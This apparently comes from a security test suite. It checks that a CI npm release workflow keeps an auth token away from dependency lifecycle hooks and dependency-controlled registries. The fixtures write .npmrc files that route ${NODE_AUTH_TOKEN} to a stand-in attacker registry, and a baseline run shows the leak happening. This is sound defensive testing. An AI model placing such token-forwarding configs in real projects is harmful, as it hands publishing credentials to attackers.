def write_dependency_fixture(root, private_registry, attacker_registry):
    """Build file:, git, and private-registry dependencies that all run lifecycle hooks."""
    project = root / "project"
    write_package(
        project / "fixture-transitive-dependency",
        {"name": "fixture-transitive-dependency", "version": "1.0.0", "scripts": DEPENDENCY_SCRIPTS},
        LIFECYCLE_RECORDER,
    )
    write_package(
        project / "fixture-dependency",
        {
            "name": "fixture-dependency",
            "version": "1.0.0",
            "scripts": DEPENDENCY_SCRIPTS,
            "dependencies": {"fixture-transitive-dependency": "file:../fixture-transitive-dependency"},
        },
        LIFECYCLE_RECORDER,
    )

    bait = {"name": "bait", "version": "1.0.0"}
    attacker_registry.publish(bait, package_tarball(bait, {}), "/bait/-/bait-1.0.0.tgz")
    git_dependency = root / "git-dependency"
    write_package(
        git_dependency,
        {
            "name": "git-dependency",
            "version": "1.0.0",
            "scripts": DEPENDENCY_SCRIPTS,
            "devDependencies": {"bait": "1.0.0"},
        },
        LIFECYCLE_RECORDER,
    )
    # A dependency-controlled config that would forward the token to its own
    # registry if npm prepared this git dependency while the token is present.
    (git_dependency / ".npmrc").write_text(
        f"registry={attacker_registry.origin}/\n"
        f"//{attacker_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
    )
    git = ["git", "-c", "user.name=fixture", "-c", "user.email=fixture@example.invalid"]
    for command in (["init", "-q", "-b", "main"], ["add", "-A"], ["commit", "-qm", "fixture"]):
        subprocess.run(git + command, cwd=git_dependency, check=True, capture_output=True)

    private_manifest = {
        "name": "@fixture/private-dependency",
        "version": "1.0.0",
        "scripts": {
            hook: f"node record-lifecycle.cjs dependency-{hook}"
            for hook in ("preinstall", "install", "postinstall")
        },
    }
    private_tarball = package_tarball(private_manifest, {"record-lifecycle.cjs": LIFECYCLE_RECORDER})
    download_path = (
        "/download/@fixture/private-dependency/1.0.0/"
        + hashlib.sha256(private_tarball).hexdigest()
    )
    private_registry.publish(
        private_manifest | {"hasInstallScript": True}, private_tarball, download_path,
    )

    git_spec = f"git+file://{git_dependency}"
    write_package(
        project,
        {
            "name": "credential-isolation-fixture",
            "version": "1.0.0",
            "allowScripts": {
                "file:./fixture-dependency": True,
                "file:../fixture-transitive-dependency": True,
                git_spec: True,
                "@fixture/private-dependency": True,
            },
            "scripts": ROOT_SCRIPTS,
            "dependencies": {
                "fixture-dependency": "file:./fixture-dependency",
                "git-dependency": git_spec,
                "@fixture/private-dependency": "1.0.0",
            },
        },
        LIFECYCLE_RECORDER,
    )
    return project, download_path


def run_step(script, *, cwd, env):
    """Run a `run:` body as Actions runs a Linux step with no `shell:`: `bash -e {0}`."""
    with tempfile.TemporaryDirectory(prefix="node-release-step-") as script_dir:
        script_path = Path(script_dir) / "step.sh"
        script_path.write_text(script)
        return subprocess.run(
            ["bash", "-e", str(script_path)],
            cwd=cwd, env=env, text=True, capture_output=True,
        )


def with_npm_trace(env, root):
    """Put recorders in front of npm and node that log each invocation and token presence.

    npm, npx, and any `#!/usr/bin/env node` script resolve node through PATH, so
    the node recorder sees them all. A step that runs node by absolute path would
    bypass it; the lifecycle recorder's ancestor-environment scan and the
    registries' request logs remain the backstop for that case.
    """
    wrapper_dir = root / "npm-trace-bin"
    wrapper_dir.mkdir(exist_ok=True)
    node_wrapper = wrapper_dir / "node"
    node_wrapper.write_text(
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then credential=present; else credential=absent; fi\n'
        "printf '%s|%s\\n' \"$*\" \"$credential\" >> \"$NODE_TRACE\"\n"
        "exec \"$REAL_NODE\" \"$@\"\n"
    )
    node_wrapper.chmod(0o755)
    real_node = shutil.which("node", path=env["PATH"])
    assert real_node, "node is not on PATH"
    wrapper = wrapper_dir / "npm"
    wrapper.write_text(
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        'if [[ -n "${NODE_AUTH_TOKEN-}" ]]; then credential=present; else credential=absent; fi\n'
        "printf '%s|%s\\n' \"$*\" \"$credential\" >> \"$NPM_TRACE\"\n"
        "exec \"$REAL_NPM\" \"$@\"\n"
    )
    wrapper.chmod(0o755)
    real_npm = shutil.which("npm", path=env["PATH"])
    assert real_npm, "the provisioned npm is not on PATH"
    return env | {
        "PATH": f"{wrapper_dir}{os.pathsep}{env['PATH']}",
        "REAL_NPM": real_npm,
        "NPM_TRACE": str(root / "npm-trace.log"),
        "REAL_NODE": real_node,
        "NODE_TRACE": str(root / "node-trace.log"),
    }


def hooks_by_package(hook_records):
    hooks = {}
    for record in hook_records:
        package_name, hook = record.split(":", 2)[:2]
        hooks.setdefault(package_name, []).append(hook)
    return hooks


def verify_dependency_code_never_sees_credential(npm_bin, version, acquisition_step, install_step, root):
    acquisition, install = acquisition_step["run"], install_step["run"]
    private_registry = FixtureRegistry(require_token=True)
    attacker_registry = FixtureRegistry(require_token=False)
    try:
        project, download_path = write_dependency_fixture(root, private_registry, attacker_registry)
        setup_env = npm_environment(root, npm_bin, private_registry, "setup")
        run(
            ["npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"],
            cwd=project,
            env=setup_env | {"NODE_AUTH_TOKEN": TOKEN},
        )
        baseline = root / "baseline"
        shutil.copytree(project, baseline)
        # A repository-controlled config that would forward the token if the
        # credentialed step read it.
        (project / ".npmrc").write_text(
            f"registry={attacker_registry.origin}/\n"
            f"//{attacker_registry.origin.removeprefix('http://')}/:_authToken=${{NODE_AUTH_TOKEN}}\n"
        )

        # A UUID in the runner temp path makes `npm config get cache` refuse to
        # print the cache path, as npm treats such a value as possibly secret.
        runner_temp = root / "runner-temp-3f2b8c1e-9a4d-4e6f-8b2a-1c3d5e7f9a0b"
        runner_temp.mkdir()
        job_env = with_npm_trace(npm_environment(root, npm_bin, private_registry, "release"), root) | {
            "GITHUB_WORKSPACE": str(project),
            "RUNNER_TEMP": str(runner_temp),
            "NODE_AUTH_TOKEN": "",
        }
        del job_env["npm_config_cache"]
        acquisition_env = job_env | resolve_step_env(acquisition_step, runner_temp) | {
            "PRIVATE_PACKAGE_REGISTRY": private_registry.origin,
        }
        install_env = job_env | resolve_step_env(install_step, runner_temp)
        assert acquisition_env["NODE_AUTH_TOKEN"] == TOKEN
        assert install_env["NODE_AUTH_TOKEN"] == ""
        private_registry.requests.clear()
        attacker_registry.requests.clear()
        materialize_acquisition_contract(project)
        acquired = run_step(acquisition, cwd=project, env=acquisition_env)
        assert acquired.returncode == 0, f"npm {version}: {acquired.stdout}{acquired.stderr}"
        assert not (project / ACQUISITION_CONTRACT).exists(), (
            "the acquisition contract checkout must not remain in the workspace for packing"
        )
        acquisition_requests = list(private_registry.requests)
        private_registry.requests.clear()
        installed = run_step(install, cwd=project, env=install_env)
        assert installed.returncode == 0, f"npm {version}: {installed.stdout}{installed.stderr}"

        records = Path(job_env["LIFECYCLE_LOG"]).read_text().splitlines()
        exposed = [record for record in records if not record.endswith(":<unset>:[]:[]")]
        assert not exposed, f"npm {version}: dependency code observed the credential: {exposed}"
        attacker_token_requests = [
            path for path, authorization in attacker_registry.requests if authorization
            and TOKEN in authorization
        ]
        assert not attacker_token_requests, (
            f"npm {version}: a dependency-controlled registry received the credential: "
            f"{attacker_token_requests}"
        )
        assert acquisition_requests and all(
            request == (download_path, f"Bearer {TOKEN}") for request in acquisition_requests
        ), f"npm {version}: the credential was used for more than the locked download: {acquisition_requests}"
        assert private_registry.requests == [], (
            f"npm {version}: the tokenless install contacted the private registry: "
            f"{private_registry.requests}"
        )
        assert (project / "node_modules/@fixture/private-dependency/package.json").is_file()
        assert not leftover_acquisition_dirs(runner_temp), list(runner_temp.iterdir())
        download_url = f"{private_registry.origin}{download_path}"
        trace = Path(job_env["NPM_TRACE"]).read_text().splitlines()
        credentialed = [line.rsplit("|", 1)[0] for line in trace if line.endswith("|present")]
        assert credentialed == ["--version", f"cache add {download_url}"], (
            f"npm {version}: unexpected npm invocations with the credential: {credentialed}"
        )
        assert "ci --prefer-offline|absent" in trace, trace
        npm_cli = Path(npm_bin).parent / "package/bin/npm-cli.js"
        node_trace = Path(job_env["NODE_TRACE"]).read_text().splitlines()
        credentialed_node = [line.rsplit("|", 1)[0] for line in node_trace if line.endswith("|present")]
        assert credentialed_node == [
            f"- package-lock.json {private_registry.origin} unset",
            f"{npm_cli} --version",
            f"{npm_cli} cache add {download_url}",
        ], f"npm {version}: unexpected node invocations with the credential: {credentialed_node}"

        # Without the workflow's boundary the same fixture leaks the credential
        # through lifecycle hooks, an ancestor environment, and a git
        # dependency's own registry config; the assertions above are not vacuous.
        baseline_env = npm_environment(root, npm_bin, private_registry, "baseline")
        attacker_registry.requests.clear()
        run(
            ["npm", "ci", "--no-audit", "--no-fund"],
            cwd=baseline,
            env=baseline_env | {"NODE_AUTH_TOKEN": TOKEN},
        )
        baseline_records = Path(baseline_env["LIFECYCLE_LOG"]).read_text().splitlines()
        assert any(f":{TOKEN}:" in record for record in baseline_records), baseline_records
        assert any(json.loads(record.rsplit(":", 1)[-1]) for record in baseline_records), (
            "baseline fixture must demonstrate lifecycle code can read an ancestor environment"
        )
        assert any(
            authorization == f"Bearer {TOKEN}" for _, authorization in attacker_registry.requests
        ), f"npm {version}: baseline git dependency did not reach its own registry with the credential"
        # The attacker registry is configured only by the git dependency's own
        # .npmrc. Nothing at a higher precedence names it: the baseline project
        # has no .npmrc and neither the user nor the global config mentions it,
        # so the request above can only have come from the dependency .npmrc
        # path (#1845). Without this the baseline could pass through some other
        # route and leave the dependency path unproven.
        for config_variable in ("NPM_CONFIG_USERCONFIG", "NPM_CONFIG_GLOBALCONFIG"):
            assert attacker_registry.origin not in Path(baseline_env[config_variable]).read_text(), (
                f"{config_variable} must not name the dependency-controlled registry"
            )
        assert not any(key.lower() == "npm_config_registry" for key in baseline_env), (
            "an exported registry would outrank the git dependency's .npmrc and hide the attack path"
        )
        assert any(
            path == "/bait" and authorization == f"Bearer {TOKEN}"
            for path, authorization in attacker_registry.requests
        ), (
            f"npm {version}: the credentialed request must be the git dependency's own devDependency "
            f"resolution through its .npmrc: {attacker_registry.requests}"
        )
        required_dependency_hooks = {
            f"{package_name}:dependency-{hook}"
            for package_name in ("fixture-dependency", "fixture-transitive-dependency", "git-dependency")
            for hook in ("preinstall", "install", "postinstall", "prepare")
        } | {
            f"@fixture/private-dependency:dependency-{hook}"
            for hook in ("preinstall", "install", "postinstall")
        }
        baseline_hooks = Counter(":".join(record.split(":")[:2]) for record in baseline_records)
        assert required_dependency_hooks <= baseline_hooks.keys(), (
            f"npm {version}: baseline skipped approved hooks: {required_dependency_hooks - baseline_hooks.keys()}"
        )
        helper_hooks = Counter(":".join(record.split(":")[:2]) for record in records)
        assert helper_hooks == baseline_hooks, (
            f"npm {version}: credentialless install changed lifecycle hooks: "
            f"{helper_hooks!r} != {baseline_hooks!r}"
        )
        assert hooks_by_package(records) == hooks_by_package(baseline_records), (
            f"npm {version}: credentialless install changed lifecycle order within a package"
        )
    finally:
        private_registry.close()
        attacker_registry.close()


def verify_empty_dependency_tree(npm_bin, version, acquisition_step, install_step, root):
    acquisition, install = acquisition_step["run"], install_step["run"]
    private_registry = FixtureRegistry(require_token=True)
    try:
        empty_root = root / "empty-dependency-fixture"
        write_package(
            empty_root,
            {
                "name": "empty-dependency-fixture",
                "version": "1.0.0",
                "scripts": {
                    "dependencies": "node record-lifecycle.cjs empty-dependencies",
                    "postinstall": "node record-lifecycle.cjs empty-postinstall",
                },
            },
            LIFECYCLE_RECORDER,
        )
        env = npm_environment(root, npm_bin, private_registry, "empty")
        run(
            ["npm", "install", "--package-lock-only", "--ignore-scripts", "--no-audit", "--no-fund"],
            cwd=empty_root,
            env=env,
        )
        runner_temp = root / "empty-runner-temp"
        runner_temp.mkdir()
        job_env = env | {
            "GITHUB_WORKSPACE": str(empty_root),
            "RUNNER_TEMP": str(runner_temp),
            "NODE_AUTH_TOKEN": "",
        }
        acquisition_env = job_env | resolve_step_env(acquisition_step, runner_temp) | {
            "PRIVATE_PACKAGE_REGISTRY": private_registry.origin,
        }
        materialize_acquisition_contract(empty_root)
        acquired = run_step(acquisition, cwd=empty_root, env=acquisition_env)
        assert acquired.returncode == 0, f"npm {version}: {acquired.stdout}{acquired.stderr}"
        installed = run_step(install, cwd=empty_root, env=job_env | resolve_step_env(install_step, runner_temp))
        assert installed.returncode == 0, f"npm {version}: {installed.stdout}{installed.stderr}"
        assert private_registry.requests == []
        records = Path(env["LIFECYCLE_LOG"]).read_text().splitlines()
        assert records == ["empty-dependency-fixture:empty-postinstall:<unset>:[]:[]"], records
    finally:
        private_registry.close()


if __name__ == "__main__":
    main()
